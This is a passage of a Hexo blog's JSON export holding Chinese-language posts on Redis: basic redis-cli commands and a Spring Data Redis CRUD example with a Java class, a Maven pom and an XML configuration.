class=\"line\">keys * #*可以是正则表达式</span><br><span class=\"line\"></span><br><span class=\"line\">KEYS pattern</span><br><span class=\"line\">查找所有符合给定模式 pattern 的 key 。</span><br><span class=\"line\"></span><br><span class=\"line\">KEYS * 匹配数据库中所有 key 。</span><br><span class=\"line\">KEYS h?llo 匹配 hello ， hallo 和 hxllo 等。</span><br><span class=\"line\">KEYS h*llo 匹配 hllo 和 heeeeello 等。</span><br><span class=\"line\">KEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hillo 。</span><br><span class=\"line\">特殊符号用 \\ 隔开</span><br></pre></td></tr></table></figure></p>\n<p>设置key</p>\n<pre><code>set keyname keyvalue\n</code></pre><p>取String类型key的值</p>\n<pre><code>get keyname\n</code></pre><p>取List类型key的值</p>\n<pre><code>lrange kenanme 0 -1 #0,-1是起始位置\n</code></pre><p>删除</p>\n<pre><code>del key\n</code></pre><p>批量删除</p>\n<pre><code>./redis-cli keys &quot;a-*&quot; | xargs ./redis-cli del\n</code></pre>"},{"title":"redis增删改查----Spring+redis","date":"2018-07-10T13:09:20.000Z","_content":"https://www.ibm.com/developerworks/cn/java/os-springredis/index.html\n\nhttps://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started\n\nhttps://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/\n\njava 文件\n```\nackage com.hundsun.account.hs_rt_account.redis;\n\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\nimport org.springframework.data.redis.core.ListOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\n\n/**\n * Created by asdas 2017/11/9.\n * for test\n */\npublic class TestRedis {\n\n\n    private static RedisTemplate redisTemplate;\n    private static ListOperations hellolistops;\n\n    public static void main(String[] args) {\n        ApplicationContext ac = new ClassPathXmlApplicationContext(new String[]{\"applicationContext-redis.xml\"});\n        //从Spring容器中根据bean的id取出我们要使用的userService对象\n        redisTemplate = (RedisTemplate) ac.getBean(\"redisTemplate\");\n        hellolistops = redisTemplate.opsForList();\n        TestRedis tr = new TestRedis();\n\n        tr.addHello(\"test1\", \"first\");\n        tr.addHello(\"test2\", \"second\");\n        tr.addHello(\"test3\", \"third\");\n\n        tr.delHello(\"test3\");\n\n        tr.modHello(\"test2\", \"di er ge\");\n\n        System.out.println(tr.getHello(\"test1\"));\n        System.out.println(tr.getHello(\"test2\"));\n        System.out.println(tr.getHello(\"test3\"));\n    }\n\n    public void addHello(String id, String hello) {\n         hellolistops.leftPush(id, hello);\n        //System.out.println(l);\n    }\n\n    public void delHello(String id) {\n        redisTemplate.delete(id);\n    }\n\n    public void modHello(String id, String hello_mod) {\n        redisTemplate.delete(id);\n        hellolistops.leftPush(id, hello_mod);\n    }\n\n    public String getHello(String id) {\n        return hellolistops.range(id, 0, -1).toString();\n    }\n}\n\n```\npom文件\n```\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n\t<modelVersion>4.0.0</modelVersion>\n\n\t<groupId>com.hundsun.account</groupId>\n\t<artifactId>hs-rt-account</artifactId>\n\t<version>0.0.1-SNAPSHOT</version>\n\t<packaging>jar</packaging>\n\n\t<name>hs-rt-account</name>\n\n\t<properties>\n\t\t<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n\t\t<project.compile.ver>1.7</project.compile.ver>\n\t</properties>\n\n\t<dependencies>\n\n\t\t<dependency>\n\t\t\t<groupId>junit</groupId>\n\t\t\t<artifactId>junit</artifactId>\n\t\t\t<version>4.8.1</version>\n\t\t</dependency>\n\n\n\t\n\t\t<!-- redis -->\n\t\t<dependency>\n\t\t\t<groupId>org.springframework.data</groupId>\n\t\t\t<artifactId>spring-data-redis</artifactId>\n\t\t\t<version>1.8.8.RELEASE</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>redis.clients</groupId>\n\t\t\t<artifactId>jedis</artifactId>\n\t\t\t<version>2.9.0</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>commons-pool</groupId>\n\t\t\t<artifactId>commons-pool</artifactId>\n\t\t\t<version>1.6</version>\n\t\t</dependency>\n\n\t</dependencies>\n\t\n</project>\n\n```\nspring配置文件\napplicationContext-redis.xml\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t\txmlns:p=\"http://www.springframework.org/schema/p\"\n\t\txmlns:context=\"http://www.springframework.org/schema/context\" \n\t\txsi:schemaLocation=\"\n\t\t\thttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n\t\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n\t<bean id=\"jedisConnectionFactory\"\n\t\tclass=\"org.springframework.data.redis.connection.jedis.JedisConnectionFactory\"\n\t\tp:host-name=\"${redis.host}\" p:port=\"${redis.port}\" p:password=\"${redis.pass}\">\n\t</bean>\n\t<!-- Configurer that replaces ${...} placeholders with values from a properties \n\t\tfile -->\n\t<context:property-placeholder location=\"classpath:redis.properties\" />\n\n\t<context:annotation-config />\n\n\t<bean id=\"redisTemplate\" class=\"org.springframework.data.redis.core.RedisTemplate\"\n\t\tp:connection-factory-ref=\"jedisConnectionFactory\">\n\t\t<property name=\"keySerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"valueSerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"hashKeySerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"hashValueSerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t</bean>\n\n</beans>\n\n```","source":"_posts/数据库/redis/redis增删改查----Spring+redis.md","raw":"---\ntitle: redis增删改查----Spring+redis\ndate: 2018-07-10 21:09:20\ntags: redis\n---\nhttps://www.ibm.com/developerworks/cn/java/os-springredis/index.html\n\nhttps://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started\n\nhttps://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/\n\njava 文件\n```\nackage com.hundsun.account.hs_rt_account.redis;\n\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\nimport org.springframework.data.redis.core.ListOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\n\n/**\n * Created by asdas 2017/11/9.\n * for test\n */\npublic class TestRedis {\n\n\n    private static RedisTemplate redisTemplate;\n    private static ListOperations hellolistops;\n\n    public static void main(String[] args) {\n        ApplicationContext ac = new ClassPathXmlApplicationContext(new String[]{\"applicationContext-redis.xml\"});\n        //从Spring容器中根据bean的id取出我们要使用的userService对象\n        redisTemplate = (RedisTemplate) ac.getBean(\"redisTemplate\");\n        hellolistops = redisTemplate.opsForList();\n        TestRedis tr = new TestRedis();\n\n        tr.addHello(\"test1\", \"first\");\n        tr.addHello(\"test2\", \"second\");\n        tr.addHello(\"test3\", \"third\");\n\n        tr.delHello(\"test3\");\n\n        tr.modHello(\"test2\", \"di er ge\");\n\n        System.out.println(tr.getHello(\"test1\"));\n        System.out.println(tr.getHello(\"test2\"));\n        System.out.println(tr.getHello(\"test3\"));\n    }\n\n    public void addHello(String id, String hello) {\n         hellolistops.leftPush(id, hello);\n        //System.out.println(l);\n    }\n\n    public void delHello(String id) {\n        redisTemplate.delete(id);\n    }\n\n    public void modHello(String id, String hello_mod) {\n        redisTemplate.delete(id);\n        hellolistops.leftPush(id, hello_mod);\n    }\n\n    public String getHello(String id) {\n        return hellolistops.range(id, 0, -1).toString();\n    }\n}\n\n```\npom文件\n```\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n\t<modelVersion>4.0.0</modelVersion>\n\n\t<groupId>com.hundsun.account</groupId>\n\t<artifactId>hs-rt-account</artifactId>\n\t<version>0.0.1-SNAPSHOT</version>\n\t<packaging>jar</packaging>\n\n\t<name>hs-rt-account</name>\n\n\t<properties>\n\t\t<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n\t\t<project.compile.ver>1.7</project.compile.ver>\n\t</properties>\n\n\t<dependencies>\n\n\t\t<dependency>\n\t\t\t<groupId>junit</groupId>\n\t\t\t<artifactId>junit</artifactId>\n\t\t\t<version>4.8.1</version>\n\t\t</dependency>\n\n\n\t\n\t\t<!-- redis -->\n\t\t<dependency>\n\t\t\t<groupId>org.springframework.data</groupId>\n\t\t\t<artifactId>spring-data-redis</artifactId>\n\t\t\t<version>1.8.8.RELEASE</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>redis.clients</groupId>\n\t\t\t<artifactId>jedis</artifactId>\n\t\t\t<version>2.9.0</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>commons-pool</groupId>\n\t\t\t<artifactId>commons-pool</artifactId>\n\t\t\t<version>1.6</version>\n\t\t</dependency>\n\n\t</dependencies>\n\t\n</project>\n\n```\nspring配置文件\napplicationContext-redis.xml\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t\txmlns:p=\"http://www.springframework.org/schema/p\"\n\t\txmlns:context=\"http://www.springframework.org/schema/context\" \n\t\txsi:schemaLocation=\"\n\t\t\thttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n\t\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n\t<bean id=\"jedisConnectionFactory\"\n\t\tclass=\"org.springframework.data.redis.connection.jedis.JedisConnectionFactory\"\n\t\tp:host-name=\"${redis.host}\" p:port=\"${redis.port}\" p:password=\"${redis.pass}\">\n\t</bean>\n\t<!-- Configurer that replaces ${...} placeholders with values from a properties \n\t\tfile -->\n\t<context:property-placeholder location=\"classpath:redis.properties\" />\n\n\t<context:annotation-config />\n\n\t<bean id=\"redisTemplate\" class=\"org.springframework.data.redis.core.RedisTemplate\"\n\t\tp:connection-factory-ref=\"jedisConnectionFactory\">\n\t\t<property name=\"keySerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"valueSerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"hashKeySerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t\t<property name=\"hashValueSerializer\">\n\t\t\t<bean class=\"org.springframework.data.redis.serializer.StringRedisSerializer\" />\n\t\t</property>\n\t</bean>\n\n</beans>\n\n```","slug":"数据库/redis/redis增删改查----Spring+redis","published":1,"updated":"2018-07-10T13:10:10.022Z","_id":"cjjedmhdo00a90gtjkvchfbkq","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"https://www.ibm.com/developerworks/cn/java/os-springredis/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/os-springredis/index.html</a></p>\n<p><a href=\"https://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started\" target=\"_blank\" rel=\"noopener\">https://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started</a></p>\n<p><a href=\"https://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/\" target=\"_blank\" rel=\"noopener\">https://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/</a></p>\n<p>java 文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ackage com.hundsun.account.hs_rt_account.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class=\"line\">import org.springframework.data.redis.core.ListOperations;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by asdas 2017/11/9.</span><br><span class=\"line\"> * for test</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class TestRedis &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static RedisTemplate redisTemplate;</span><br><span class=\"line\">    private static ListOperations hellolistops;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        ApplicationContext ac = new ClassPathXmlApplicationContext(new String[]&#123;&quot;applicationContext-redis.xml&quot;&#125;);</span><br><span class=\"line\">        //从Spring容器中根据bean的id取出我们要使用的userService对象</span><br><span class=\"line\">        redisTemplate = (RedisTemplate) ac.getBean(&quot;redisTemplate&quot;);</span><br><span class=\"line\">        hellolistops = redisTemplate.opsForList();</span><br><span class=\"line\">        TestRedis tr = new TestRedis();</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.addHello(&quot;test1&quot;, &quot;first&quot;);</span><br><span class=\"line\">        tr.addHello(&quot;test2&quot;, &quot;second&quot;);</span><br><span class=\"line\">        tr.addHello(&quot;test3&quot;, &quot;third&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.delHello(&quot;test3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.modHello(&quot;test2&quot;, &quot;di er ge&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(tr.getHello(&quot;test1&quot;));</span><br><span class=\"line\">        System.out.println(tr.getHello(&quot;test2&quot;));</span><br><span class=\"line\">        System.out.println(tr.getHello(&quot;test3&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void addHello(String id, String hello) &#123;</span><br><span class=\"line\">         hellolistops.leftPush(id, hello);</span><br><span class=\"line\">        //System.out.println(l);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void delHello(String id) &#123;</span><br><span class=\"line\">        redisTemplate.delete(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void modHello(String id, String hello_mod) &#123;</span><br><span class=\"line\">        redisTemplate.delete(id);</span><br><span class=\"line\">        hellolistops.leftPush(id, hello_mod);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getHello(String id) &#123;</span><br><span class=\"line\">        return hellolistops.range(id, 0, -1).toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>pom文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class=\"line\">\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;groupId&gt;com.hundsun.account&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;hs-rt-account&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">\t&lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;name&gt;hs-rt-account&lt;/name&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;properties&gt;</span><br><span class=\"line\">\t\t&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">\t\t&lt;project.compile.ver&gt;1.7&lt;/project.compile.ver&gt;</span><br><span class=\"line\">\t&lt;/properties&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;4.8.1&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t&lt;!-- redis --&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;org.springframework.data&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;spring-data-redis&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.8.8.RELEASE&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;commons-pool&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;commons-pool&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.6&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;/dependencies&gt;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure></p>\n<p>spring配置文件<br>applicationContext-redis.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">\t\txmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class=\"line\">\t\txmlns:context=&quot;http://www.springframework.org/schema/context&quot; </span><br><span class=\"line\">\t\txsi:schemaLocation=&quot;</span><br><span class=\"line\">\t\t\thttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class=\"line\">\t\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;bean id=&quot;jedisConnectionFactory&quot;</span><br><span class=\"line\">\t\tclass=&quot;org.springframework.data.redis.connection.jedis.JedisConnectionFactory&quot;</span><br><span class=\"line\">\t\tp:host-name=&quot;$&#123;redis.host&#125;&quot; p:port=&quot;$&#123;redis.port&#125;&quot; p:password=&quot;$&#123;redis.pass&#125;&quot;&gt;</span><br><span class=\"line\">\t&lt;/bean&gt;</span><br><span class=\"line\">\t&lt;!-- Configurer that replaces $&#123;...&#125; placeholders with values from a properties </span><br><span class=\"line\">\t\tfile --&gt;</span><br><span class=\"line\">\t&lt;context:property-placeholder location=&quot;classpath:redis.properties&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;context:annotation-config /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;bean id=&quot;redisTemplate&quot; class=&quot;org.springframework.data.redis.core.RedisTemplate&quot;</span><br><span class=\"line\">\t\tp:connection-factory-ref=&quot;jedisConnectionFactory&quot;&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;keySerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;valueSerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;hashKeySerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;hashValueSerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://www.ibm.com/developerworks/cn/java/os-springredis/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/os-springredis/index.html</a></p>\n<p><a href=\"https://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started\" target=\"_blank\" rel=\"noopener\">https://docs.spring.io/spring-data/data-redis/docs/current/reference/html/#get-started</a></p>\n<p><a href=\"https://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/\" target=\"_blank\" rel=\"noopener\">https://docs.spring.io/spring-data/redis/docs/2.0.1.RELEASE/api/</a></p>\n<p>java 文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ackage com.hundsun.account.hs_rt_account.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class=\"line\">import org.springframework.data.redis.core.ListOperations;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by asdas 2017/11/9.</span><br><span class=\"line\"> * for test</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class TestRedis &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static RedisTemplate redisTemplate;</span><br><span class=\"line\">    private static ListOperations hellolistops;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        ApplicationContext ac = new ClassPathXmlApplicationContext(new String[]&#123;&quot;applicationContext-redis.xml&quot;&#125;);</span><br><span class=\"line\">        //从Spring容器中根据bean的id取出我们要使用的userService对象</span><br><span class=\"line\">        redisTemplate = (RedisTemplate) ac.getBean(&quot;redisTemplate&quot;);</span><br><span class=\"line\">        hellolistops = redisTemplate.opsForList();</span><br><span class=\"line\">        TestRedis tr = new TestRedis();</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.addHello(&quot;test1&quot;, &quot;first&quot;);</span><br><span class=\"line\">        tr.addHello(&quot;test2&quot;, &quot;second&quot;);</span><br><span class=\"line\">        tr.addHello(&quot;test3&quot;, &quot;third&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.delHello(&quot;test3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        tr.modHello(&quot;test2&quot;, &quot;di er ge&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(tr.getHello(&quot;test1&quot;));</span><br><span class=\"line\">        